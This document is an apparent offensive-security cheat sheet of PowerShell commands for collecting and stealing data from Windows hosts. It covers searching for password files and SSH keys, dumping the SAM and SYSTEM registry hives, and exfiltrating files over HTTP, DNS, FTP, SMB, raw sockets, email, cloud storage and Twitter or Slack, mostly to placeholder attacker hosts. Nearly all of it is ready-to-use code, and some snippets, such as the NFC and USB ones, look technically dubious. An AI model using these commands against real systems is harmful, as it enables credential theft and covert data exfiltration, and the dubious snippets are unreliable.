# Data Collection

#### File System Search

Search for Configuration Files:

```
Get-ChildItem -Path C:\ -Include *.conf -Recurse -ErrorAction SilentlyContinue
```

Search for Log Files:

```
Get-ChildItem -Path C:\ -Include *.log -Recurse -ErrorAction SilentlyContinue
```

Search for Files with "password" in the Name:

```
Get-ChildItem -Path C:\ -Include *password* -Recurse -ErrorAction SilentlyContinue
```

Search for SSH Keys:

```
Get-ChildItem -Path C:\Users\ -Include *.ssh -Recurse -ErrorAction SilentlyContinue
```

#### Copying Sensitive Files

Copy File to a Temporary Directory:

```
Copy-Item -Path C:\path\to\sensitivefile.txt -Destination C:\Temp\sensitivefile_copy.txt
```

Copy System File (e.g., SAM File):

```
Copy-Item -Path C:\Windows\System32\config\SAM -Destination C:\Temp\SAM_copy
```

Copy Web Server Configuration File:

```
Copy-Item -Path C:\inetpub\wwwroot\web.config -Destination C:\Temp\webconfig_copy.config
```

#### Archiving Data

Archive Sensitive Files into a Compressed ZIP:

```
Compress-Archive -Path C:\Temp\sensitivefile_copy.txt -DestinationPath C:\Temp\sensitive_data.zip
```

Archive a Directory into a ZIP File:

```
Compress-Archive -Path C:\path\to\directory -DestinationPath C:\Temp\directory_data.zip
```

#### Gathering Credentials

Extract Passwords from Web Server Configuration:

```
Select-String -Path C:\inetpub\wwwroot\web.config -Pattern "password" -CaseSensitive
```

Read Command History (PowerShell History):

```
Get-Content -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Dump Local SAM Database (Requires SYSTEM Privileges):

```
reg save HKLM\SAM C:\Temp\SAM_dump.hiv
reg save HKLM\SYSTEM C:\Temp\SYSTEM_dump.hiv
```

# File Obfuscation and Stealth Techniques

#### File Encryption

Encrypt a File Using ```AES``` with a Passphrase:

```
$Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes("password", [Byte[]]::new(16), 1000)).GetBytes(32)
$IV = [Byte[]]::new(16)
$AES = New-Object Security.Cryptography.AesManaged
$AES.Key, $AES.IV = $Key, $IV
[System.IO.File]::WriteAllBytes("C:\Temp\encrypted_file", $AES.CreateEncryptor().TransformFinalBlock([System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt"), 0, [System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt").Length))
```

#### Data Encoding (Base64)

Encode a File in Base64:

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt")) | Set-Content -Path "C:\Temp\encoded_file.txt"
```

Compress and Encode Data:

```
Compress-Archive -Path C:\Temp\sensitivefile_copy.txt -DestinationPath C:\Temp\sensitive_data.zip
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\sensitive_data.zip")) | Set-Content -Path "C:\Temp\encoded_compressed.txt"
```

#### Fileless Data Exfiltration

Exfiltrate Data Without Creating Local Files:

```
Invoke-WebRequest -Uri "http://<remote_ip>/upload" -Method Post -Body "Sensitive Data"
```

Stream Data Directly to a Remote Server:

```
$Stream = [System.IO.File]::OpenRead("C:\Temp\sensitivefile_copy.txt")
Invoke-WebRequest -Uri "http://<remote_ip>/upload" -Method Post -InFile $Stream
$Stream.Close()
```

# Data Exfiltration via Standard Protocols

#### HTTP/HTTPS

Upload Data via HTTP POST:

```
Invoke-WebRequest -Uri "http://<remote_ip>/upload" -Method Post -InFile "C:\Temp\sensitivefile_copy.txt"
```

Exfiltrate Data by Encoding in URL Parameters:

```
$Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt"))
Invoke-WebRequest -Uri "http://<remote_ip>/upload?data=$Data"
```

#### FTP

Exfiltrate Files Using FTP:

```
$WebClient = New-Object System.Net.WebClient
$WebClient.Credentials = New-Object System.Net.NetworkCredential("username", "password")
$WebClient.UploadFile("ftp://<remote_ip>/sensitivefile.txt", "C:\Temp\sensitivefile_copy.txt")
```

#### SFTP

Exfiltrate Files Using SFTP:

```
$SFTP = New-Object WinSCP.SessionOptions
$SFTP.Protocol = [WinSCP.Protocol]::Sftp
$SFTP.HostName = "<remote_ip>"
$SFTP.UserName = "username"
$SFTP.Password = "password"
$Session = New-Object WinSCP.Session
$Session.Open($SFTP)
$Session.PutFiles("C:\Temp\sensitivefile_copy.txt", "/path/to/remote/directory/").Check()
```

#### SMB

Exfiltrate Data Using SMB:

```
$SMBPath = "\\<remote_ip>\share"
New-PSDrive -Name "X" -PSProvider FileSystem -Root $SMBPath -Credential (New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force)))
Copy-Item -Path "C:\Temp\sensitivefile_copy.txt" -Destination "X:\"
Remove-PSDrive -Name "X"
```

#### DNS

Exfiltrate Data Using DNS Queries:

```
$Data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt"))
$Query = "$($Data.Substring(0,253)).<attack_domain>"
Resolve-DnsName -Name $Query
```

# Data Exfiltration via Public Services

#### Twitter

Tweet Exfiltrated Data Using Twitter API:

```
$Tweet = "Exfiltrated Data: $(Get-Content -Path C:\Temp\sensitivefile_copy.txt)"
Invoke-RestMethod -Uri "https://api.twitter.com/2/tweets" -Method Post -Headers @{Authorization="Bearer <ACCESS_TOKEN>"} -Body @{text=$Tweet}
```

#### Slack

Send Exfiltrated Data to a Slack Channel:

```
$Data = Get-Content -Path "C:\Temp\sensitivefile_copy.txt"
$Body = @{channel="#channel_name"; text="Exfiltrated Data: $Data"} | ConvertTo-Json
Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Method Post -Headers @{Authorization="Bearer <ACCESS_TOKEN>"; "Content-Type"="application/json"} -Body $Body
```

# Data Exfiltration via Cloud

#### AWS S3

Upload File to AWS S3:

```
aws s3 cp C:\Temp\sensitivefile_copy.txt s3://bucket_name/remote_file.txt
```

#### Google Drive

Upload Files to Google Drive Using `gdrive`:

```
gdrive upload "C:\Temp\sensitivefile_copy.txt"
```

# Data Exfiltration via SQL Databases

#### SQL Server (MSSQL)

Exfiltrate Data Using SQL Query:

```
$ConnectionString = "Server=<server_ip>;Database=<database_name>;User Id=<username>;Password=<password>;"
$Query = "SELECT * FROM <table_name>;"
$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
$SqlConnection.ConnectionString = $ConnectionString
$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
$SqlCmd.CommandText = $Query
$SqlCmd.Connection = $SqlConnection
$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
$SqlAdapter.SelectCommand = $SqlCmd
$DataSet = New-Object System.Data.DataSet
$SqlAdapter.Fill($DataSet)
$DataSet.Tables[0] | Out-File -FilePath C:\Temp\mssql_data.txt
```

Export Data from SQL Server to a File:

```
Invoke-Sqlcmd -ServerInstance "<server_ip>" -Database "<database_name>" -Query "SELECT * FROM <table_name>" | Export-Csv -Path C:\Temp\mssql_data.csv
```

#### MySQL

Exfiltrate Data Using MySQL Query:

```
$Connection = New-Object MySql.Data.MySqlClient.MySqlConnection
$Connection.ConnectionString = "server=<server_ip>;user id=<username>;password=<password>;database=<database_name>"
$Connection.Open()
$Command = $Connection.CreateCommand()
$Command.CommandText = "SELECT * FROM <table_name>"
$Reader = $Command.ExecuteReader()
$Results = New-Object System.Collections.Generic.List[System.Object]
while ($Reader.Read()) {
    $Row = @{}
    for ($i = 0; $i -lt $Reader.FieldCount; $i++) {
        $Row[$Reader.GetName($i)] = $Reader.GetValue($i)
    }
    $Results.Add($Row)
}
$Results | ConvertTo-Csv | Out-File -FilePath C:\Temp\mysql_data.csv
$Connection.Close()
```

Dump MySQL Database and Exfiltrate:

```
& "C:\Program Files\MySQL\MySQL Server <version>\bin\mysqldump.exe" -u <username> -p<password> <database_name> | Out-File -FilePath C:\Temp\mysql_dump.sql
```

# Data Exfiltration via Email

#### Send Email with PowerShell

Send Email with Attachment Using `Send-MailMessage`:

```
$SMTPServer = "<smtp_server>"
$SMTPFrom = "attacker@example.com"
$SMTPTo = "recipient@example.com"
$MessageSubject = "Exfiltrated Data"
$MessageBody = "Please find the attached file."
$Attachment = "C:\Temp\sensitivefile_copy.txt"
Send-MailMessage -From $SMTPFrom -To $SMTPTo -Subject $MessageSubject -Body $MessageBody -SmtpServer $SMTPServer -Attachments $Attachment
```

Automate Email Exfiltration:

```
$EmailList = Get-Content -Path "C:\Temp\email_list.txt"
foreach ($Email in $EmailList) {
    Send-MailMessage -From "attacker@example.com" -To $Email -Subject "Exfiltrated Data" -Body "Sensitive data attached." -Attachments "C:\Temp\sensitivefile_copy.txt" -SmtpServer "<smtp_server>"
}
```

# Data Exfiltration via Non-Standard Protocols

#### Netcat (Using PowerShell to Invoke)

Exfiltrate Data via Netcat:

```
$FilePath = "C:\Temp\sensitivefile_copy.txt"
$FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
$TcpClient = New-Object Net.Sockets.TcpClient("<attack_ip>", <attack_port>)
$NetworkStream = $TcpClient.GetStream()
$NetworkStream.Write($FileBytes, 0, $FileBytes.Length)
$NetworkStream.Close()
$TcpClient.Close()
```

Receive Data on a Remote Server:

```
$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, <local_port>)
$TcpListener.Start()
$Client = $TcpListener.AcceptTcpClient()
$NetworkStream = $Client.GetStream()
$Buffer = New-Object Byte[] 1024
$OutputFile = "C:\Temp\received_data.txt"
$FileStream = [System.IO.File]::Create($OutputFile)
while (($Read = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {
    $FileStream.Write($Buffer, 0, $Read)
}
$FileStream.Close()
$NetworkStream.Close()
$Client.Close()
$TcpListener.Stop()
```

#### WebSockets

Exfiltrate Data Over WebSockets:

```
$WebSocket = New-Object -TypeName System.Net.WebSockets.ClientWebSocket
$Uri = [Uri] "ws://<remote_ip>/upload"
$WebSocket.ConnectAsync($Uri, [System.Threading.CancellationToken]::None).Wait()
$Data = [System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt")
$Buffer = [System.ArraySegment[byte]]::new($Data)
$WebSocket.SendAsync($Buffer, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, [System.Threading.CancellationToken]::None).Wait()
$WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Finished", [System.Threading.CancellationToken]::None).Wait()
```

# Data Exfiltration via Custom and Covert Channels

#### Exfiltration via Custom Scripts

Custom Script for HTTP Exfiltration:

```
$Data = Get-Content -Path "C:\Temp\sensitivefile_copy.txt"
foreach ($Line in $Data) {
    Invoke-WebRequest -Uri "http://<remote_ip>/upload" -Method Post -Body $Line
}
```

#### Exfiltration via Custom Encrypted Channel

Encrypt Data Before Exfiltration Using AES:

```
$Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes("password", [Byte[]]::new(16), 1000)).GetBytes(32)
$IV = [Byte[]]::new(16)
$AES = New-Object Security.Cryptography.AesManaged
$AES.Key, $AES.IV = $Key, $IV
$Data = [System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt")
$EncryptedData = $AES.CreateEncryptor().TransformFinalBlock($Data, 0, $Data.Length)
[System.IO.File]::WriteAllBytes("C:\Temp\encrypted_data", $EncryptedData)
```

Exfiltrate Encrypted Data Using Netcat:

```
$TcpClient = New-Object Net.Sockets.TcpClient("<remote_ip>", <remote_port>)
$NetworkStream = $TcpClient.GetStream()
$EncryptedData = [System.IO.File]::ReadAllBytes("C:\Temp\encrypted_data")
$NetworkStream.Write($EncryptedData, 0, $EncryptedData.Length)
$NetworkStream.Close()
$TcpClient.Close()
```

#### Covert Data Exfiltration via DNS

Slow Data Exfiltration via DNS Queries:

```
$Data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt"))
foreach ($Chunk in $Data -split '(.{253})') {
    Resolve-DnsName -Name "$($Chunk).<attack_domain>"
    Start-Sleep -Seconds 5
}
```

# Data Exfiltration via Physical Media

#### USB Drive Exfiltration

Automatically Exfiltrate Data When USB Is Inserted:

```
Register-ObjectEvent -InputObject (New-Object IO.FileSystemWatcher) -EventName Created -SourceIdentifier USBEvent -Action {
    $DriveLetter = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq "USB" } | Select-Object -ExpandProperty DriveLetter
    Copy-Item -Path "C:\Temp\sensitivefile_copy.txt" -Destination "$DriveLetter\sensitivefile_copy.txt"
} | Out-Null
```

# Data Exfiltration via Wireless

#### Wi-Fi Networks

Exfiltrate Data Over Wi-Fi Using `netsh`:

```
netsh wlan export profile name=<profile_name> folder=C:\Temp\
```

Use Wi-Fi Direct for Data Exfiltration:

```
netsh wlan start hostednetwork mode=allow ssid=<network_name> key=<password>
Copy-Item -Path "C:\Temp\sensitivefile_copy.txt" -Destination "\\<peer_ip>\C$\sensitivefile_copy.txt"
```

#### Bluetooth

Exfiltrate Data via Bluetooth Using `Bluetooth File Transfer`:

```
$Bluetooth = [System.Net.WebRequest]::Create("obex://<target_mac>/<path_to_local_file>")
$Bluetooth.Method = "PUT"
$Bluetooth.ContentType = "application/octet-stream"
$Stream = $Bluetooth.GetRequestStream()
$FileStream = [System.IO.File]::OpenRead("C:\Temp\sensitivefile_copy.txt")
$FileStream.CopyTo($Stream)
$FileStream.Close()
$Stream.Close()
```

#### RFID/NFC

Write Data to an NFC Tag:

```
$Data = [System.IO.File]::ReadAllBytes("C:\Temp\sensitivefile_copy.txt")
[IO.File]::WriteAllBytes("C:\Temp\nfc_data.mfd", $Data)
```

Read and Exfiltrate Data from an NFC Tag:

```
$Data = [IO.File]::ReadAllBytes("C:\Temp\nfc_data.mfd")
Invoke-WebRequest -Uri "http://<remote_ip>/upload" -Method Post -Body $Data
```